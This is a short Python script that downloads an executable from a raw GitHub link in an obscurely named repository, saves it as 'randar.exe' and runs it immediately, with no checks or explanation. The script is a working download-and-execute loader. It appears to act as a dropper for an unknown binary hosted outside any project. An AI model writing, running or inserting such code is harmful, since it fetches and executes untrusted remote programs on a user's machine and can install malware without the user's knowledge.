import urllib.request
import subprocess
import os

def download_and_run(url, filename="randar.exe"):
    print(f"Downloading {url} ...")
    urllib.request.urlretrieve(url, filename)
    print(f"Downloaded to {filename}, running...")
    subprocess.run([os.path.abspath(filename)], check=True)

def main():
    url = "https://github.com/deprosinal/jubilant-parakeet/raw/refs/heads/main/41222.exe"
    download_and_run(url)

if __name__ == "__main__":
    main()
